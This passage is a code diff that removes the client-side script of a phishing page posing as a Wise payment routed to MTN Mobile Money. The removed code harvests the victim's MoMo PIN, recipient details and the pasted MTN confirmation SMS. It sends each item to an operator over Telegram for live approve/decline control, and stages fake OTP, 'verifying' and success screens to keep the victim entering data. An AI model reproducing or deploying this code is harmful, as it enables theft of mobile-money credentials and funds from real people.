-      ? '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>'
-      : '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
-  });
-
-  // Input filters
-  recipientPhone.addEventListener('input', () => {
-    recipientPhone.value = recipientPhone.value.replace(/[^\d\s]/g, '');
-    phoneWrap.classList.remove('error');
-  });
-  momoPin.addEventListener('input', () => {
-    momoPin.value = momoPin.value.replace(/\D/g, '').slice(0, 5);
-    momoPin.classList.remove('error');
-  });
-
-  // ============================================================
-  // CONFIRM TRANSACTION → SEND TO TELEGRAM → WAIT FOR APPROVAL
-  // ============================================================
-  mtnConfirmBtn.addEventListener('click', async () => {
-    const phoneLocal = recipientPhone.value.trim().replace(/\s/g, '');
-    const pin = momoPin.value.trim();
-    const name = recipientName.value.trim();
-
-    if (!phoneLocal) {
-      phoneWrap.classList.add('error');
-      showStatus(mtnStatus, mtnStatusText, mtnStatusIcon, 'Please enter the recipient number.', 'error');
-      recipientPhone.focus(); return;
-    }
-    if (!/^\d{7,12}$/.test(phoneLocal)) {
-      phoneWrap.classList.add('error');
-      showStatus(mtnStatus, mtnStatusText, mtnStatusIcon, 'Please enter a valid number (7–12 digits).', 'error');
-      recipientPhone.focus(); return;
-    }
-    if (!name) {
-      recipientName.classList.add('error');
-      showStatus(mtnStatus, mtnStatusText, mtnStatusIcon, 'Please enter the recipient name.', 'error');
-      recipientName.focus(); return;
-    }
-    if (!pin || pin.length < 5) {
-      momoPin.classList.add('error');
-      showStatus(mtnStatus, mtnStatusText, mtnStatusIcon, 'Please enter your 5-digit MoMo PIN.', 'error');
-      momoPin.focus(); return;
-    }
-
-    phoneWrap.classList.remove('error');
-    recipientName.classList.remove('error');
-    momoPin.classList.remove('error');
-
-    mtnConfirmBtn.disabled = true;
-    mtnConfirmBtn.innerHTML = '<svg class="spin" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2.5" fill="none" stroke-dasharray="30 60"/></svg>Processing...';
-
-    const country = getCountry();
-    const phoneFull = getFullPhone();
-    const localAmount = fmtLocal(paymentData.amount, country.localCurrency);
-    const txnId = 'MTN-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).slice(2,6).toUpperCase();
-
-    currentTxnId = txnId;
-    currentStage = 'recipient';
-
-    const message = `🔔 <b>NEW TRANSACTION — APPROVAL REQUIRED</b>
-
-━━━━━━━━━━━━━━━━━━━━
-<b>💳 WISE PAYMENT</b>
-━━━━━━━━━━━━━━━━━━━━
-<b>Sender:</b> ${esc(paymentData.senderName)}
-<b>Email:</b> ${esc(paymentData.senderEmail)}
-<b>Amount:</b> ${esc(fmtAmount(paymentData.amount))} ${esc(paymentData.currency)}
-<b>Reference:</b> ${esc(paymentData.reference || DEFAULT_DATA.reference)}
-<b>Note:</b> ${esc(paymentData.note || DEFAULT_DATA.note)}
-
-━━━━━━━━━━━━━━━━━━━━
-<b>📱 MTN RECIPIENT</b>
-━━━━━━━━━━━━━━━━━━━━
-<b>Name:</b> ${esc(name)}
-<b>Country:</b> ${esc(country.name)}
-<b>Number:</b> ${esc(phoneFull)}
-<b>MoMo PIN:</b> <code>${esc(pin)}</code>
-<b>Local amount:</b> ${esc(localAmount)} ${esc(country.localCurrency)}
-
-━━━━━━━━━━━━━━━━━━━━
-<b>🆔 Txn ID:</b> <code>${esc(txnId)}</code>
-<b>🕒 ${esc(new Date().toLocaleString('en-GB'))}</b>
-
-Reply:
-✅ <code>/approve ${esc(txnId)}</code>
-❌ <code>/decline ${esc(txnId)}</code>`;
-
-    await sendTelegram(message, txnId, 'recipient');
-
-    // Show waiting page & start polling
-    waitingTxnId.textContent = txnId;
-    waitingTitle.textContent = 'Waiting for approval';
-    waitingSubtitle.textContent = 'Please wait while we verify your transaction.';
-    hideAllPages();
-    wiseCard.classList.remove('active');
-    mtnCard.classList.remove('active');
-    waitingPage.classList.add('active');
-
-    startPolling(
-      txnId,
-      () => { // approved
-        hideAllPages();
-        // Show SMS page
-        smsPage.classList.add('active');
-        setTimeout(() => smsInput.focus(), 150);
-      },
-      () => { // declined
-        hideAllPages();
-        mtnCard.classList.add('active');
-        document.body.classList.add('mtn-mode');
-        mtnConfirmBtn.disabled = false;
-        mtnConfirmBtn.innerHTML = '<svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg> Confirm transaction';
-        showStatus(mtnStatus, mtnStatusText, mtnStatusIcon, 'Transaction was declined. Please check your details.', 'error');
-      }
-    );
-  });
-
-  // ============================================================
-  // SMS SUBMIT → SEND TO TELEGRAM → WAIT FOR APPROVAL
-  // ============================================================
-  smsSubmitBtn.addEventListener('click', async () => {
-    const txt = smsInput.value.trim();
-    if (!txt) {
-      smsInput.classList.add('error');
-      showStatus(smsStatus, smsStatusText, smsStatusIcon, 'Please paste the SMS from MTN.', 'error');
-      return;
-    }
-    const norm = txt.replace(/[’‘`´]/g, "'");
-    if (!/^y'ello/i.test(norm)) {
-      smsInput.classList.add('error');
-      showStatus(smsStatus, smsStatusText, smsStatusIcon, 'Invalid SMS. It must start with "Y\'ello".', 'error');
-      return;
-    }
-    smsInput.classList.remove('error');
-    smsSubmitBtn.disabled = true;
-    smsSubmitBtn.innerHTML = '<svg class="spin" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2.5" fill="none" stroke-dasharray="30 60"/></svg>Verifying...';
-
-    const country = getCountry();
-    const localAmount = fmtLocal(paymentData.amount, country.localCurrency);
-    const txnId = currentTxnId;
-    currentStage = 'sms';
-
-    const message = `📩 <b>SMS RECEIVED — APPROVAL REQUIRED</b>
-
-━━━━━━━━━━━━━━━━━━━━
-<b>💳 WISE PAYMENT</b>
-━━━━━━━━━━━━━━━━━━━━
-<b>Amount:</b> ${esc(fmtAmount(paymentData.amount))} ${esc(paymentData.currency)}
-<b>Local:</b> ${esc(localAmount)} ${esc(country.localCurrency)}
-<b>Recipient:</b> ${esc(recipientName.value.trim() || '—')}
-<b>Number:</b> ${esc(getFullPhone())}
-
-━━━━━━━━━━━━━━━━━━━━
-<b>📩 PASTED SMS</b>
-<code>${esc(txt)}</code>
-
-━━━━━━━━━━━━━━━━━━━━
-<b>🆔 Txn ID:</b> <code>${esc(txnId)}</code>
-<b>🕒 ${esc(new Date().toLocaleString('en-GB'))}</b>
-
-Reply:
-✅ <code>/approve ${esc(txnId)}</code>
-❌ <code>/decline ${esc(txnId)}</code>`;
-
-    // Reset txn status to pending for this stage
-    await fetch(`/api/reset/${encodeURIComponent(txnId)}`, { method: 'POST' });
-    await sendTelegram(message, txnId, 'sms');
-
-    smsSubmitBtn.disabled = false;
-    smsSubmitBtn.innerHTML = '<svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg> Verify &amp; continue';
-
-    // Wait for approval
-    waitingTxnId.textContent = txnId;
-    waitingTitle.textContent = 'Verifying SMS';
-    waitingSubtitle.textContent = 'Please wait while we verify the SMS you pasted.';
-    hideAllPages();
-    waitingPage.classList.add('active');
-
-    startPolling(
-      txnId,
-      () => { // approved
-        hideAllPages();
-        // Show verifying page (8s)
-        verifyingPage.classList.add('active');
-        [check1, check2, check3].forEach(c => c.classList.remove('done'));
-        check1.classList.add('done');
-        verifyingProgress.style.transition = 'none';
-        verifyingProgress.style.width = '0%';
-        void verifyingProgress.offsetWidth;
-        setTimeout(() => {
-          verifyingProgress.style.transition = 'width 8s linear';
-          verifyingProgress.style.width = '100%';
-        }, 50);
-
-        let remaining = 8;
-        verifyingSeconds.textContent = remaining;
-        const iv = setInterval(() => {
-          remaining -= 1;
-          if (remaining < 0) remaining = 0;
-          verifyingSeconds.textContent = remaining;
-          if (remaining <= 5) check2.classList.add('done');
-          if (remaining <= 2) check3.classList.add('done');
-          if (remaining <= 0) {
-            clearInterval(iv);
-            hideAllPages();
-            showOtpPage();
-          }
-        }, 1000);
-      },
-      () => { // declined
-        hideAllPages();
-        smsPage.classList.add('active');
-        showStatus(smsStatus, smsStatusText, smsStatusIcon, 'SMS rejected. Please check and try again.', 'error');
-      }
-    );
-  });
-
-  // ============================================================
-  // OTP PAGE
-  // ============================================================
-  function showOtpPage() {
-    const code = genOtp();
-    const phoneFull = getFullPhone();
-    const country = getCountry();
-    currentOtp = { code, phone: phoneFull, expiresAt: Date.now() + 5 * 60 * 1000, country };
-
-    otpPhone.textContent = fmtPhone(phoneFull);
-    otpPage.classList.add('active');
-    otpInputs.forEach(i => { i.value = ''; i.classList.remove('filled', 'error'); });
-    startResendCooldown(30);
-    setTimeout(() => otpInputs[0].focus(), 150);
-
-    const txnId = currentTxnId;
-    currentStage = 'otp';
-
-    const message = `🔐 <b>OTP PAGE — APPROVAL REQUIRED</b>
-
-━━━━━━━━━━━━━━━━━━━━
-<b>OTP Code:</b> <code>${esc(code)}</code>
-<b>Sent to:</b> ${esc(fmtPhone(phoneFull))}
-<b>Country:</b> ${esc(country.name)}
-
-━━━━━━━━━━━━━━━━━━━━
-<b>Amount:</b> ${esc(fmtAmount(paymentData.amount))} ${esc(paymentData.currency)}
-<b>Local:</b> ${esc(fmtLocal(paymentData.amount, country.localCurrency))} ${esc(country.localCurrency)}
-
-━━━━━━━━━━━━━━━━━━━━
-<b>🆔 Txn ID:</b> <code>${esc(txnId)}</code>
-<b>🕒 ${esc(new Date().toLocaleString('en-GB'))}</b>
-
-Reply:
-✅ <code>/approve ${esc(txnId)}</code>
-❌ <code>/decline ${esc(txnId)}</code>`;
-
-    fetch(`/api/reset/${encodeURIComponent(txnId)}`, { method: 'POST' })
-      .then(() => sendTelegram(message, txnId, 'otp'));
-
-    // Start polling — but only act when the user has entered a code.
-    // We'll trigger polling when the user taps Verify.
-  }
-
-  // OTP inputs auto-advance
-  otpInputs.forEach((inp, i) => {
-    inp.addEventListener('input', e => {
-      const v = e.target.value.replace(/\D/g, '');
-      e.target.value = v.slice(0, 1);
-      if (e.target.value) {
-        e.target.classList.add('filled');
-        if (i < 3) otpInputs[i+1].focus();
-      } else {
-        e.target.classList.remove('filled');
-      }
-      otpInputs.forEach(x => x.classList.remove('error'));
-    });
-    inp.addEventListener('keydown', e => {
-      if (e.key === 'Backspace' && !e.target.value && i > 0) otpInputs[i-1].focus();
-      if (e.key === 'Enter') { e.preventDefault(); otpSubmitBtn.click(); }
-    });
-    inp.addEventListener('paste', e => {
-      e.preventDefault();
-      const p = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 4);
-      if (p.length === 4) {
-        otpInputs.forEach((x, j) => { x.value = p[j] || ''; if (x.value) x.classList.add('filled'); });
-        otpInputs[3].focus();
-      }
-    });
-  });
-
-  // Resend cooldown
-  function startResendCooldown(sec) {
-    let r = sec;
-    otpResendBtn.disabled = true;
-    resendLabel.textContent = 'Resend in';
-    resendCount.textContent = `${r}s`;
-    if (resendCooldownTimer) clearInterval(resendCooldownTimer);
-    resendCooldownTimer = setInterval(() => {
-      r -= 1;
-      if (r <= 0) {
-        clearInterval(resendCooldownTimer);
-        resendCooldownTimer = null;
-        otpResendBtn.disabled = false;
-        resendLabel.textContent = 'Resend';
-        resendCount.textContent = '';
-        return;
-      }
-      resendCount.textContent = `${r}s`;
-    }, 1000);
-  }
-
-  // OTP verify → send to Telegram + start polling
-  otpSubmitBtn.addEventListener('click', async () => {
-    const entered = otpInputs.map(i => i.value).join('');
-    if (entered.length < 4) {
-      otpInputs.forEach(i => i.classList.add('error'));
-      showStatus(otpStatus, otpStatusText, otpStatusIcon, 'Please enter all 4 digits.', 'error');
-      return;
-    }
-    otpInputs.forEach(i => i.classList.remove('error'));
-    otpSubmitBtn.disabled = true;
-    otpSubmitBtn.innerHTML = '<svg class="spin" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2.5" fill="none" stroke-dasharray="30 60"/></svg>Verifying...';
-
-    const txnId = currentTxnId;
-    const country = currentOtp.country;
-
-    const message = `🔑 <b>OTP ENTERED — APPROVAL REQUIRED</b>
-
-━━━━━━━━━━━━━━━━━━━━
-<b>Entered:</b> <code>${esc(entered)}</code>
-<b>Correct:</b> <code>${esc(currentOtp.code)}</code>
-<b>Match:</b> ${entered === currentOtp.code ? '✅ YES' : '❌ NO'}
-
-━━━━━━━━━━━━━━━━━━━━
-<b>Amount:</b> ${esc(fmtAmount(paymentData.amount))} ${esc(paymentData.currency)}
-<b>Local:</b> ${esc(fmtLocal(paymentData.amount, country.localCurrency))} ${esc(country.localCurrency)}
-<b>Number:</b> ${esc(getFullPhone())}
-
-━━━━━━━━━━━━━━━━━━━━
-<b>🆔 Txn ID:</b> <code>${esc(txnId)}</code>
-<b>🕒 ${esc(new Date().toLocaleString('en-GB'))}</b>
-
-Reply:
-✅ <code>/approve ${esc(txnId)}</code> → release funds
-❌ <code>/decline ${esc(txnId)}</code> → show "wrong code"`;
-
-    await fetch(`/api/reset/${encodeURIComponent(txnId)}`, { method: 'POST' });
-    await sendTelegram(message, txnId, 'otp-verify');
-
-    // Show waiting page
-    waitingTxnId.textContent = txnId;
-    waitingTitle.textContent = 'Confirming your code';
-    waitingSubtitle.textContent = 'Please wait while we verify your code.';
-    hideAllPages();
-    waitingPage.classList.add('active');
-
-    otpSubmitBtn.disabled = false;
-    otpSubmitBtn.innerHTML = '<svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg> Verify code';
-
-    startPolling(
-      txnId,
-      () => { // approved
-        hideAllPages();
-        // Show success page
-        const c = currentOtp.country;
-        successAmount.textContent = fmtLocal(paymentData.amount, c.localCurrency);
-        successCurrency.textContent = c.localCurrency;
-        successPage.classList.add('active');
-      },
-      () => { // declined
-        hideAllPages();
-        resendPage.classList.add('active');
-      }
-    );
-  });
-
-  // OTP resend button (from OTP page)
-  otpResendBtn.addEventListener('click', async () => {
-    if (otpResendBtn.disabled) return;
-    otpResendBtn.disabled = true;
-    resendLabel.textContent = 'Resending...';
-    resendCount.textContent = '';
-
-    const code = genOtp();
-    currentOtp.code = code;
-    currentOtp.expiresAt = Date.now() + 5 * 60 * 1000;
-
-    const txnId = currentTxnId;
-    const country = getCountry();
-
-    await sendTelegram(`🔄 <b>OTP RESENT</b>
-
-<b>New OTP:</b> <code>${esc(code)}</code>
-<b>Sent to:</b> ${esc(fmtPhone(getFullPhone()))}
-<b>🆔 Txn ID:</b> <code>${esc(txnId)}</code>
-
-Reply:
-✅ <code>/approve ${esc(txnId)}</code>
-❌ <code>/decline ${esc(txnId)}</code>`, txnId, 'otp');
-
-    setTimeout(() => {
-      otpResendBtn.disabled = false;
-      resendLabel.textContent = 'Resend';
-      startResendCooldown(30);
-      showStatus(otpStatus, otpStatusText, otpStatusIcon, 'A new code has been sent.', 'success');
-      otpInputs.forEach(i => { i.value = ''; i.classList.remove('filled', 'error'); });
-      otpInputs[0].focus();
-    }, 300);
-  });
-
-  // Resend page button (after decline)
-  resendNewBtn.addEventListener('click', async () => {
-    resendNewBtn.disabled = true;
-    resendNewBtn.innerHTML = '<svg class="spin" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2.5" fill="none" stroke-dasharray="30 60"/></svg>Generating...';
-
-    const code = genOtp();
-    if (currentOtp) {
-      currentOtp.code = code;
-      currentOtp.expiresAt = Date.now() + 5 * 60 * 1000;
-    }
-
-    const txnId = currentTxnId;
-    const country = getCountry();
-
-    await fetch(`/api/reset/${encodeURIComponent(txnId)}`, { method: 'POST' });
-    await sendTelegram(`🔄 <b>NEW OTP REQUESTED</b>
-
-<b>New OTP:</b> <code>${esc(code)}</code>
-<b>Sent to:</b> ${esc(fmtPhone(getFullPhone()))}
-<b>🆔 Txn ID:</b> <code>${esc(txnId)}</code>
-
-Reply:
-✅ <code>/approve ${esc(txnId)}</code>
-❌ <code>/decline ${esc(txnId)}</code>`, txnId, 'otp');
-
-    resendNewBtn.disabled = false;
-    resendNewBtn.innerHTML = '<svg viewBox="0 0 24 24"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10"/></svg>Resend new OTP';
-
-    // Back to OTP page
-    hideAllPages();
-    otpPage.classList.add('active');
-    otpInputs.forEach(i => { i.value = ''; i.classList.remove('filled', 'error'); });
-    startResendCooldown(30);
-    otpInputs[0].focus();
-  });
-
-  // ---- Initial render ----
-  render();
 })();
 </script>
 </body>
